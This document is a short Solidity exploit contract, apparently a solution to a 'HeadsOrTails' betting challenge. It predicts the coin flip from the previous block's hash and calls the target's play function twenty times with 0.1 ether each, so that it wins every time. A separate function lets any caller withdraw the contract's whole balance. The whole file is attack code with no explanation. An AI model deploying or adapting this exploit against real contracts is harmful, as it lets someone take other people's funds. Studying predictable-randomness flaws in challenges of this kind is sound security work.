pragma solidity 0.4.24;
import './HeadsOrTails.sol';
contract getHeads{
    bytes32 public entropy;
    bytes1 public coinFlip;
    bool public coinBool;
    
    function caller(address _aim) public {
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        if(coinFlip == 1){
            coinBool = true;
        }
        else{
            coinBool = false;
        }
        
        for(uint i = 0; i < 20; i++){
            _aim.call.value(0.1 ether)(bytes4(keccak256("play(bool)")), coinBool);
        }
    }
    
    function getback() public{
        msg.sender.send(this.balance);
    }
    
    function () payable public{
        
    }
}